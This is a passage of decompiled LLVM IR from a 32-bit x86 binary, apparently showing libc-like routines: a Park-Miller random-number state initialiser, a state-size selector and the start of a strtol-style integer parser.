  %v1_804ec0a = add i32 %tmp2, 24
  %v2_804ec0a = inttoptr i32 %v1_804ec0a to i32*
  %v3_804ec0a = load i32, i32* %v2_804ec0a, align 4
  store i32 %v3_804ec0a, i32* %edi.global-to-local, align 4
  %v1_804ec0d = inttoptr i32 %v3_804ec05 to i32*
  %v2_804ec0d = load i32, i32* %v1_804ec0d, align 4
  store i32 %v2_804ec0d, i32* %eax.global-to-local, align 4
  %v1_804ec0f = inttoptr i32 %v2_804ec08 to i32*
  %v2_804ec0f = load i32, i32* %v1_804ec0f, align 4
  %v4_804ec0f = add i32 %v2_804ec0f, %v2_804ec0d
  store i32 %v4_804ec0f, i32* %v1_804ec0f, align 4
  %v0_804ec11 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ec11 = inttoptr i32 %v0_804ec11 to i32*
  %v2_804ec11 = load i32, i32* %v1_804ec11, align 4
  %v1_804ec13 = add i32 %v0_804ec11, 4
  store i32 %v1_804ec13, i32* %edx.global-to-local, align 4
  %v2_804ec16 = udiv i32 %v2_804ec11, 2
  %v1_804ec18 = load i32, i32* %edi.global-to-local, align 4
  %v7_804ec18 = icmp ult i32 %v1_804ec13, %v1_804ec18
  %v1_804ec1a = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ec1a = inttoptr i32 %v1_804ec1a to i32*
  store i32 %v2_804ec16, i32* %v2_804ec1a, align 4
  %v0_804ec1d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ec1d = add i32 %v0_804ec1d, 4
  store i32 %v1_804ec1d, i32* %eax.global-to-local, align 4
  br i1 %v7_804ec18, label %dec_label_pc_804ec26, label %dec_label_pc_804ec22

dec_label_pc_804ec22:                             ; preds = %dec_label_pc_804ec05
  %v0_804ec22 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804ec22, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ec2c

dec_label_pc_804ec26:                             ; preds = %dec_label_pc_804ec05
  %v1_804ec26 = load i32, i32* %edi.global-to-local, align 4
  %v7_804ec26 = icmp ult i32 %v1_804ec1d, %v1_804ec26
  br i1 %v7_804ec26, label %dec_label_pc_804ec2c, label %dec_label_pc_804ec2a

dec_label_pc_804ec2a:                             ; preds = %dec_label_pc_804ec26
  %v0_804ec2a = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804ec2a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec2c

dec_label_pc_804ec2c:                             ; preds = %dec_label_pc_804ec26, %dec_label_pc_804ec22, %dec_label_pc_804ec2a
  %v0_804ec2c = load i32, i32* %edx.global-to-local, align 4
  %v1_804ec2c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ec2c = inttoptr i32 %v1_804ec2c to i32*
  store i32 %v0_804ec2c, i32* %v2_804ec2c, align 4
  %v0_804ec2e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec2e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ec2e = add i32 %v1_804ec2e, 4
  %v3_804ec2e = inttoptr i32 %v2_804ec2e to i32*
  store i32 %v0_804ec2e, i32* %v3_804ec2e, align 4
  br label %dec_label_pc_804ec31

dec_label_pc_804ec31:                             ; preds = %dec_label_pc_804ebee, %dec_label_pc_804ec2c
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804ec33 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ec33, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804ebf9, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804ec31, { 1, 0 }
  uselistorder label %dec_label_pc_804ec2c, { 2, 0, 1 }
}

define i32 @function_804ec38(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ec38:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_804ec38 = load i32, i32* @ebp, align 4
  %v0_804ec39 = load i32, i32* @edi, align 4
  %v0_804ec3a = load i32, i32* @esi, align 4
  %v0_804ec3b = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_804ec46 = trunc i64 %arg1 to i32
  store i32 %v4_804ec46, i32* %eax.global-to-local, align 4
  %v1_804ec4a = add i32 %arg2, 12
  %v2_804ec4a = inttoptr i32 %v1_804ec4a to i32*
  %v3_804ec4a = load i32, i32* %v2_804ec4a, align 4
  store i32 %v3_804ec4a, i32* %edx.global-to-local, align 4
  %v6_804ec50 = icmp ugt i32 %v3_804ec4a, 4
  br i1 %v6_804ec50, label %dec_label_pc_804ecc4, label %dec_label_pc_804ec52

dec_label_pc_804ec52:                             ; preds = %dec_label_pc_804ec38
  %v1_804ec52 = add i32 %arg2, 8
  %v2_804ec52 = inttoptr i32 %v1_804ec52 to i32*
  %v3_804ec52 = load i32, i32* %v2_804ec52, align 4
  store i32 %v3_804ec52, i32* %ebx.global-to-local, align 4
  %v1_804ec55 = icmp eq i32 %v4_804ec46, 0
  %v1_804ec57 = icmp eq i1 %v1_804ec55, false
  br i1 %v1_804ec57, label %dec_label_pc_804ec5b, label %dec_label_pc_804ec59

dec_label_pc_804ec59:                             ; preds = %dec_label_pc_804ec52
  %v1_804ec59 = and i32 %v4_804ec46, -256
  %v2_804ec59 = or i32 %v1_804ec59, 1
  store i32 %v2_804ec59, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec5b

dec_label_pc_804ec5b:                             ; preds = %dec_label_pc_804ec52, %dec_label_pc_804ec59
  %v0_804ec5b = phi i32 [ %v4_804ec46, %dec_label_pc_804ec52 ], [ %v2_804ec59, %dec_label_pc_804ec59 ]
  %v2_804ec5b = inttoptr i32 %v3_804ec52 to i32*
  store i32 %v0_804ec5b, i32* %v2_804ec5b, align 4
  %v1_804ec5d = icmp eq i32 %v3_804ec4a, 0
  br i1 %v1_804ec5d, label %dec_label_pc_804ecc2, label %dec_label_pc_804ec61

dec_label_pc_804ec61:                             ; preds = %dec_label_pc_804ec5b
  %v0_804ec61 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804ec61, i32* %edx.global-to-local, align 4
  %v0_804ec63 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804ec63, i32* %ecx.global-to-local, align 4
  %v0_804ec65 = load i32, i32* @esi, align 4
  %v1_804ec65 = add i32 %v0_804ec65, 16
  %v2_804ec65 = inttoptr i32 %v1_804ec65 to i32*
  %v3_804ec65 = load i32, i32* %v2_804ec65, align 4
  store i32 %v3_804ec65, i32* %eax.global-to-local, align 4
  %v4_804ec6d = sext i32 %v3_804ec65 to i64
  store i64 %v4_804ec6d, i64* %stack_var_-40, align 8
  %v5_804ec9f27 = icmp sgt i32 %v3_804ec65, 1
  br i1 %v5_804ec9f27, label %dec_label_pc_804ec72, label %dec_label_pc_804eca1

dec_label_pc_804ec72:                             ; preds = %dec_label_pc_804ec61, %dec_label_pc_804ec72.dec_label_pc_804ec72_crit_edge
  %v0_804ec96 = phi i32 [ %v0_804ec96.pre, %dec_label_pc_804ec72.dec_label_pc_804ec72_crit_edge ], [ %v0_804ec63, %dec_label_pc_804ec61 ]
  %v0_804ec72 = phi i32 [ %v0_804ec72.pre, %dec_label_pc_804ec72.dec_label_pc_804ec72_crit_edge ], [ %v0_804ec61, %dec_label_pc_804ec61 ]
  %v0_804ec9928 = phi i32 [ %v0_804ec9c.pre, %dec_label_pc_804ec72.dec_label_pc_804ec72_crit_edge ], [ 1, %dec_label_pc_804ec61 ]
  %v1_804ec79 = ashr i32 %v0_804ec72, 31
  %v2_804ec7a = zext i32 %v0_804ec72 to i64
  %v4_804ec7a = zext i32 %v1_804ec79 to i64
  %v5_804ec7a = mul nuw i64 %v4_804ec7a, 4294967296
  %v6_804ec7a = or i64 %v5_804ec7a, %v2_804ec7a
  %v8_804ec7a = sdiv i64 %v6_804ec7a, 127773
  %v9_804ec7a = trunc i64 %v8_804ec7a to i32
  %v10_804ec7a = srem i64 %v6_804ec7a, 127773
  %v3_804ec80 = mul nsw i64 %v10_804ec7a, 16807
  %v4_804ec80 = trunc i64 %v3_804ec80 to i32
  %v3_804ec86 = mul i32 %v9_804ec7a, 2836
  store i32 %v3_804ec86, i32* %eax.global-to-local, align 4
  %v2_804ec8c = sub i32 %v4_804ec80, %v3_804ec86
  %v13_804ec8c = icmp slt i32 %v2_804ec8c, 0
  %v1_804ec8e = icmp eq i1 %v13_804ec8c, false
  %v1_804ec90 = add i32 %v2_804ec8c, 2147483647
  %v2_804ec8c.v1_804ec90 = select i1 %v1_804ec8e, i32 %v2_804ec8c, i32 %v1_804ec90
  store i32 %v2_804ec8c.v1_804ec90, i32* %edx.global-to-local, align 4
  %v1_804ec96 = add i32 %v0_804ec96, 4
  store i32 %v1_804ec96, i32* %ecx.global-to-local, align 4
  %v1_804ec99 = add i32 %v0_804ec9928, 1
  store i32 %v1_804ec99, i32* @edi, align 4
  %v2_804ec9a = inttoptr i32 %v1_804ec96 to i32*
  store i32 %v2_804ec8c.v1_804ec90, i32* %v2_804ec9a, align 4
  %v0_804ec9c.pre = load i32, i32* @edi, align 4
  %v3_804ec9c.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_804ec9c.pre to i32
  %v5_804ec9f = icmp slt i32 %v0_804ec9c.pre, %extract.t12
  br i1 %v5_804ec9f, label %dec_label_pc_804ec72.dec_label_pc_804ec72_crit_edge, label %dec_label_pc_804ec9c.dec_label_pc_804eca1_crit_edge

dec_label_pc_804ec72.dec_label_pc_804ec72_crit_edge: ; preds = %dec_label_pc_804ec72
  %v0_804ec72.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_804ec96.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ec72

dec_label_pc_804ec9c.dec_label_pc_804eca1_crit_edge: ; preds = %dec_label_pc_804ec72
  %v0_804eca1.pre = load i32, i32* @esi, align 4
  %v0_804eca4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804eca1

dec_label_pc_804eca1:                             ; preds = %dec_label_pc_804ec9c.dec_label_pc_804eca1_crit_edge, %dec_label_pc_804ec61
  %v0_804eca4 = phi i32 [ %v0_804eca4.pre, %dec_label_pc_804ec9c.dec_label_pc_804eca1_crit_edge ], [ %v0_804ec63, %dec_label_pc_804ec61 ]
  %v0_804eca1 = phi i32 [ %v0_804eca1.pre, %dec_label_pc_804ec9c.dec_label_pc_804eca1_crit_edge ], [ %v0_804ec65, %dec_label_pc_804ec61 ]
  %v1_804eca1 = add i32 %v0_804eca1, 20
  %v2_804eca1 = inttoptr i32 %v1_804eca1 to i32*
  %v3_804eca1 = load i32, i32* %v2_804eca1, align 4
  store i32 %v3_804eca1, i32* %eax.global-to-local, align 4
  %v2_804eca4 = add i32 %v0_804eca1, 4
  %v3_804eca4 = inttoptr i32 %v2_804eca4 to i32*
  store i32 %v0_804eca4, i32* %v3_804eca4, align 4
  %v0_804eca7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804eca7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804eca7 = mul i32 %v1_804eca7, 4
  %v3_804eca7 = add i32 %v2_804eca7, %v0_804eca7
  store i32 %v3_804eca7, i32* %eax.global-to-local, align 4
  %v1_804ecaa = load i32, i32* @esi, align 4
  %v2_804ecaa = inttoptr i32 %v1_804ecaa to i32*
  store i32 %v3_804eca7, i32* %v2_804ecaa, align 4
  %v3_804ecac = load i64, i64* %stack_var_-40, align 8
  %v6_804ecac = mul nsw i64 %v3_804ecac, 10
  %v7_804ecac = trunc i64 %v6_804ecac to i32
  %v2_804ecb2 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804ecbf24 = add i32 %v7_804ecac, -1
  %v9_804ecbf25 = icmp slt i32 %v1_804ecbf24, 0
  store i32 %v1_804ecbf24, i32* @ebx, align 4
  %v1_804ecc026 = icmp eq i1 %v9_804ecbf25, false
  br i1 %v1_804ecc026, label %dec_label_pc_804ecb2, label %dec_label_pc_804ecc2

dec_label_pc_804ecb2:                             ; preds = %dec_label_pc_804eca1, %dec_label_pc_804ecb2
  store i32 %v2_804ecb2, i32* %eax.global-to-local, align 4
  %v0_804ecb7 = load i32, i32* @esi, align 4
  %v2_804ecb8 = inttoptr i32 %v0_804ecb7 to i32*
  %v3_804ecb8 = call i32 @function_804ebd9(i32* %v2_804ecb8, i32 %v2_804ecb2)
  store i32 %v0_804ecb7, i32* %eax.global-to-local, align 4
  store i32 %v2_804ecb2, i32* %edx.global-to-local, align 4
  %v0_804ecbf.pre = load i32, i32* @ebx, align 4
  %v1_804ecbf = add i32 %v0_804ecbf.pre, -1
  %v9_804ecbf = icmp slt i32 %v1_804ecbf, 0
  store i32 %v1_804ecbf, i32* @ebx, align 4
  %v1_804ecc0 = icmp eq i1 %v9_804ecbf, false
  br i1 %v1_804ecc0, label %dec_label_pc_804ecb2, label %dec_label_pc_804ecc2

dec_label_pc_804ecc2:                             ; preds = %dec_label_pc_804eca1, %dec_label_pc_804ecb2, %dec_label_pc_804ec5b
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ecc4

dec_label_pc_804ecc4:                             ; preds = %dec_label_pc_804ec38, %dec_label_pc_804ecc2
  %v0_804ecc7 = phi i32 [ -1, %dec_label_pc_804ec38 ], [ 0, %dec_label_pc_804ecc2 ]
  store i32 %v0_804ecc7, i32* %eax.global-to-local, align 4
  store i32 %v0_804ec3b, i32* @ebx, align 4
  store i32 %v0_804ec3a, i32* @esi, align 4
  store i32 %v0_804ec39, i32* @edi, align 4
  store i32 %v0_804ec38, i32* @ebp, align 4
  ret i32 %v0_804ecc7

; uselistorder directives
  uselistorder i32 %v0_804ecc7, { 1, 0 }
  uselistorder i32 %v1_804ecbf, { 1, 0 }
  uselistorder i32 %v0_804eca1, { 1, 0 }
  uselistorder i32 %v0_804ec9c.pre, { 1, 0 }
  uselistorder i32 %v2_804ec8c.v1_804ec90, { 1, 0 }
  uselistorder i32 %v0_804ec72, { 1, 0 }
  uselistorder i32 %v0_804ec63, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ecc4, { 1, 0 }
  uselistorder label %dec_label_pc_804ecc2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ecb2, { 1, 0 }
  uselistorder label %dec_label_pc_804ec72, { 1, 0 }
  uselistorder label %dec_label_pc_804ec5b, { 1, 0 }
}

define i32 @function_804ecce(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804ecce:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_804ecd1 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_804ecf2, label %dec_label_pc_804ece6

dec_label_pc_804ece6:                             ; preds = %dec_label_pc_804ecce
  %v2_804ece6 = icmp ult i32 %arg3, 256
  %v1_804eced = select i1 %v2_804ece6, i32 5, i32 4
  store i32 %v1_804eced, i32* @ebx, align 4
  br label %dec_label_pc_804ed08

dec_label_pc_804ecf2:                             ; preds = %dec_label_pc_804ecce
  %v6_804ecf5 = icmp ugt i32 %arg3, 31
  br i1 %v6_804ecf5, label %dec_label_pc_804ed00, label %dec_label_pc_804ecf7

dec_label_pc_804ecf7:                             ; preds = %dec_label_pc_804ecf2
  store i32 0, i32* @ebx, align 4
  %v6_804ecfc = icmp ugt i32 %arg3, 7
  br i1 %v6_804ecfc, label %dec_label_pc_804ed08, label %dec_label_pc_804ed58

dec_label_pc_804ed00:                             ; preds = %dec_label_pc_804ecf2
  %v2_804ed00 = icmp ult i32 %arg3, 64
  %v1_804ed05 = select i1 %v2_804ed00, i32 3, i32 2
  store i32 %v1_804ed05, i32* @ebx, align 4
  br label %dec_label_pc_804ed08

dec_label_pc_804ed08:                             ; preds = %dec_label_pc_804ecf7, %dec_label_pc_804ece6, %dec_label_pc_804ed00
  %v0_804ed08 = phi i32 [ 0, %dec_label_pc_804ecf7 ], [ %v1_804eced, %dec_label_pc_804ece6 ], [ %v1_804ed05, %dec_label_pc_804ed00 ]
  %v1_804ed08 = mul nuw nsw i32 %v0_804ed08, 4
  %v2_804ed08 = add i32 %v1_804ed08, ptrtoint (i32* @global_var_80542f4.168 to i32)
  %v3_804ed08 = inttoptr i32 %v2_804ed08 to i32*
  %v4_804ed08 = load i32, i32* %v3_804ed08, align 4
  store i32 %v4_804ed08, i32* %eax.global-to-local, align 4
  %v1_804ed0f = add i32 %tmp7, 4
  store i32 %v1_804ed0f, i32* @esi, align 4
  %v2_804ed12 = add i32 %arg4, 16
  %v3_804ed12 = inttoptr i32 %v2_804ed12 to i32*
  store i32 %v4_804ed08, i32* %v3_804ed12, align 4
  %v0_804ed15 = load i32, i32* @ebx, align 4
  %v1_804ed15 = mul i32 %v0_804ed15, 4
  %v2_804ed15 = add i32 %v1_804ed15, ptrtoint (i32* @global_var_80542e0.169 to i32)
  %v3_804ed15 = inttoptr i32 %v2_804ed15 to i32*
  %v4_804ed15 = load i32, i32* %v3_804ed15, align 4
  store i32 %v4_804ed15, i32* %edx.global-to-local, align 4
  %v0_804ed1c = load i32, i32* @esi, align 4
  %v1_804ed1c = load i32, i32* %eax.global-to-local, align 4
  %v2_804ed1c = mul i32 %v1_804ed1c, 4
  %v3_804ed1c = add i32 %v2_804ed1c, %v0_804ed1c
  store i32 %v3_804ed1c, i32* %eax.global-to-local, align 4
  %v1_804ed1f = load i32, i32* @edi, align 4
  %v2_804ed1f = add i32 %v1_804ed1f, 12
  %v3_804ed1f = inttoptr i32 %v2_804ed1f to i32*
  store i32 %v0_804ed15, i32* %v3_804ed1f, align 4
  %v0_804ed22 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ed22 = load i32, i32* @edi, align 4
  %v2_804ed22 = add i32 %v1_804ed22, 20
  %v3_804ed22 = inttoptr i32 %v2_804ed22 to i32*
  store i32 %v0_804ed22, i32* %v3_804ed22, align 4
  %v0_804ed25 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed25 = load i32, i32* @edi, align 4
  %v2_804ed25 = add i32 %v1_804ed25, 24
  %v3_804ed25 = inttoptr i32 %v2_804ed25 to i32*
  store i32 %v0_804ed25, i32* %v3_804ed25, align 4
  %v0_804ed28 = load i32, i32* @esi, align 4
  %v1_804ed28 = load i32, i32* @edi, align 4
  %v2_804ed28 = add i32 %v1_804ed28, 8
  %v3_804ed28 = inttoptr i32 %v2_804ed28 to i32*
  store i32 %v0_804ed28, i32* %v3_804ed28, align 4
  %v0_804ed2b = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_804ed30 = sext i32 %arg1 to i64
  %v3_804ed30 = call i32 @function_804ec38(i64 %v2_804ed30, i32 %v0_804ed2b)
  %v0_804ed35 = load i32, i32* @ebp, align 4
  %v1_804ed35 = inttoptr i32 %v0_804ed35 to i32*
  store i32 0, i32* %v1_804ed35, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804ed40 = load i32, i32* @ebx, align 4
  %v1_804ed40 = icmp eq i32 %v0_804ed40, 0
  br i1 %v1_804ed40, label %dec_label_pc_804ed71, label %dec_label_pc_804ed44

dec_label_pc_804ed44:                             ; preds = %dec_label_pc_804ed08
  %v0_804ed44 = load i32, i32* @edi, align 4
  %v1_804ed44 = add i32 %v0_804ed44, 4
  %v2_804ed44 = inttoptr i32 %v1_804ed44 to i32*
  %v3_804ed44 = load i32, i32* %v2_804ed44, align 4
  %v1_804ed47 = load i32, i32* @esi, align 4
  %v2_804ed47 = sub i32 %v3_804ed44, %v1_804ed47
  %v2_804ed49 = sdiv i32 %v2_804ed47, 4
  %v3_804ed4c = mul i32 %v2_804ed49, 5
  %v2_804ed4f = add i32 %v3_804ed4c, %v0_804ed40
  %v1_804ed51 = load i32, i32* @ebp, align 4
  %v2_804ed51 = inttoptr i32 %v1_804ed51 to i32*
  store i32 %v2_804ed4f, i32* %v2_804ed51, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804ed58:                             ; preds = %dec_label_pc_804ecf7
  %v1_804ed58 = call i32 @function_804b774(i32 %v0_804ecd1)
  store i32 %v1_804ed58, i32* %eax.global-to-local, align 4
  %v1_804ed5d = inttoptr i32 %v1_804ed58 to i32*
  store i32 22, i32* %v1_804ed5d, align 4
  %v0_804ed63 = load i32, i32* %stack_var_-36, align 4
  %v1_804ed63 = call i32 @function_804b774(i32 %v0_804ed63)
  %v1_804ed68 = inttoptr i32 %v1_804ed63 to i32*
  store i32 22, i32* %v1_804ed68, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804ed71:                             ; preds = %dec_label_pc_804ed08, %dec_label_pc_804ed44, %dec_label_pc_804ed58
  %v0_804ed78 = phi i32 [ 0, %dec_label_pc_804ed08 ], [ 0, %dec_label_pc_804ed44 ], [ -1, %dec_label_pc_804ed58 ]
  ret i32 %v0_804ed78

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ed71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ed08, { 2, 0, 1 }
}

define i32 @function_804ed7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ed7c:
  %v3_804ed87 = call i32 @function_804ed90(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804ed87
}

define i32 @function_804ed90(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804ed90:
  %v4_804eda1 = inttoptr i32 %arg1 to i8*
  %v5_804eda1 = call i32 @function_804edac(i8* %v4_804eda1, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804eda1
}

define i32 @function_804edac(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804edac:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_804edaf = load i32, i32* @ebx, align 4
  store i32 %v0_804edaf, i32* %stack_var_-16, align 4
  %v0_804edb3 = load i32, i32* @global_var_8056080, align 128
  store i32 %v0_804edb3, i32* %edx.global-to-local, align 4
  %v4_804edb9 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_804edb9, i32* %ebx.global-to-local, align 4
  %v2_804edc641 = load i8, i8* %arg1, align 1
  %v3_804edc642 = sext i8 %v2_804edc641 to i32
  store i32 %v3_804edc642, i32* %eax.global-to-local, align 4
  %v2_804edc943 = mul nsw i32 %v3_804edc642, 2
  %v3_804edc944 = add i32 %v2_804edc943, %v0_804edb3
  %v4_804edc945 = inttoptr i32 %v3_804edc944 to i8*
  %v5_804edc946 = load i8, i8* %v4_804edc945, align 1
  %v6_804edc947 = and i8 %v5_804edc946, 32
  %v7_804edc948 = icmp eq i8 %v6_804edc947, 0
  %v1_804edcd49 = icmp eq i1 %v7_804edc948, false
  br i1 %v1_804edcd49, label %dec_label_pc_804edc5, label %dec_label_pc_804edcf

dec_label_pc_804edc5:                             ; preds = %dec_label_pc_804edac, %dec_label_pc_804edc5
  %v0_804edc550 = phi i32 [ %v1_804edc5, %dec_label_pc_804edc5 ], [ %v4_804edb9, %dec_label_pc_804edac ]
  %v1_804edc5 = add i32 %v0_804edc550, 1
  store i32 %v1_804edc5, i32* %ebx.global-to-local, align 4
  %v1_804edc6 = inttoptr i32 %v1_804edc5 to i8*
  %v2_804edc6 = load i8, i8* %v1_804edc6, align 1
  %v3_804edc6 = sext i8 %v2_804edc6 to i32
  store i32 %v3_804edc6, i32* %eax.global-to-local, align 4
  %v2_804edc9 = mul nsw i32 %v3_804edc6, 2
  %v3_804edc9 = add i32 %v2_804edc9, %v0_804edb3
  %v4_804edc9 = inttoptr i32 %v3_804edc9 to i8*
  %v5_804edc9 = load i8, i8* %v4_804edc9, align 1
  %v6_804edc9 = and i8 %v5_804edc9, 32
  %v7_804edc9 = icmp eq i8 %v6_804edc9, 0
  %v1_804edcd = icmp eq i1 %v7_804edc9, false
  br i1 %v1_804edcd, label %dec_label_pc_804edc5, label %dec_label_pc_804edcf

dec_label_pc_804edcf:                             ; preds = %dec_label_pc_804edc5, %dec_label_pc_804edac
  %v0_804edc5.lcssa = phi i32 [ %v4_804edb9, %dec_label_pc_804edac ], [ %v1_804edc5, %dec_label_pc_804edc5 ]
  %v2_804edc6.lcssa = phi i8 [ %v2_804edc641, %dec_label_pc_804edac ], [ %v2_804edc6, %dec_label_pc_804edc5 ]
  %v3_804edc6.lcssa = phi i32 [ %v3_804edc642, %dec_label_pc_804edac ], [ %v3_804edc6, %dec_label_pc_804edc5 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_804edcf = icmp eq i8 %v2_804edc6.lcssa, 43
  br i1 %v9_804edcf, label %dec_label_pc_804ede4, label %dec_label_pc_804edd4

dec_label_pc_804edd4:                             ; preds = %dec_label_pc_804edcf
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_804edd6 = icmp eq i8 %v2_804edc6.lcssa, 45
  %v1_804edd9 = icmp eq i1 %v9_804edd6, false
  br i1 %v1_804edd9, label %dec_label_pc_804ede5, label %dec_label_pc_804ede4

dec_label_pc_804ede4:                             ; preds = %dec_label_pc_804edcf, %dec_label_pc_804edd4
  %storemerge3 = phi i32 [ 1, %dec_label_pc_804edd4 ], [ 0, %dec_label_pc_804edcf ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_804ede4 = add i32 %v0_804edc5.lcssa, 1
  store i32 %v1_804ede4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ede5

dec_label_pc_804ede5:                             ; preds = %dec_label_pc_804edd4, %dec_label_pc_804ede4
  %v0_804edf7 = phi i32 [ %v0_804edc5.lcssa, %dec_label_pc_804edd4 ], [ %v1_804ede4, %dec_label_pc_804ede4 ]
  %v1_804ede7 = and i32 %arg3, -17
  %v2_804ede7 = icmp eq i32 %v1_804ede7, 0
  %v1_804eded = icmp eq i1 %v2_804ede7, false
  br i1 %v1_804eded, label %dec_label_pc_804ee13, label %dec_label_pc_804edef

dec_label_pc_804edef:                             ; preds = %dec_label_pc_804ede5
  %v1_804edef = add i32 %arg3, 10
  store i32 %v1_804edef, i32* %esi.global-to-local, align 4
  %v1_804edf2 = inttoptr i32 %v0_804edf7 to i8*
  %v2_804edf2 = load i8, i8* %v1_804edf2, align 1
  %v8_804edf2 = icmp eq i8 %v2_804edf2, 48
  %v1_804edf5 = icmp eq i1 %v8_804edf2, false
  br i1 %v1_804edf5, label %dec_label_pc_804ee09, label %dec_label_pc_804edf7

dec_label_pc_804edf7:                             ; preds = %dec_label_pc_804edef
  %v1_804edf7 = add i32 %v0_804edf7, 1
  store i32 %v1_804edf7, i32* %ebx.global-to-local, align 4
  %v1_804edf8 = add i32 %arg3, 8
  store i32 %v1_804edf8, i32* %esi.global-to-local, align 4
  %v1_804edfd = inttoptr i32 %v1_804edf7 to i8*
  %v2_804edfd = load i8, i8* %v1_804edfd, align 1
  %v3_804edfd = zext i8 %v2_804edfd to i32
  %v5_804edfd = and i32 %v3_804edc6.lcssa, -256
  %v6_804edfd = or i32 %v5_804edfd, %v3_804edfd
  %v1_804edff = or i32 %v6_804edfd, 32
  %v3_804edff = trunc i32 %v1_804edff to i8
  store i32 %v1_804edff, i32* %eax.global-to-local, align 4
  %v10_804ee02 = icmp eq i8 %v3_804edff, 120
  %v1_804ee04 = icmp eq i1 %v10_804ee02, false
  br i1 %v1_804ee04, label %dec_label_pc_804ee09, label %dec_label_pc_804ee06

dec_label_pc_804ee06:                             ; preds = %dec_label_pc_804edf7
  %v2_804ee06 = mul i32 %v1_804edf8, 2
  store i32 %v2_804ee06, i32* %esi.global-to-local, align 4
  %v1_804ee08 = add i32 %v0_804edf7, 2
  store i32 %v1_804ee08, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ee09

dec_label_pc_804ee09:                             ; preds = %dec_label_pc_804edf7, %dec_label_pc_804edef, %dec_label_pc_804ee06
  %v0_804ee3212 = phi i32 [ %v1_804edf7, %dec_label_pc_804edf7 ], [ %v0_804edf7, %dec_label_pc_804edef ], [ %v1_804ee08, %dec_label_pc_804ee06 ]
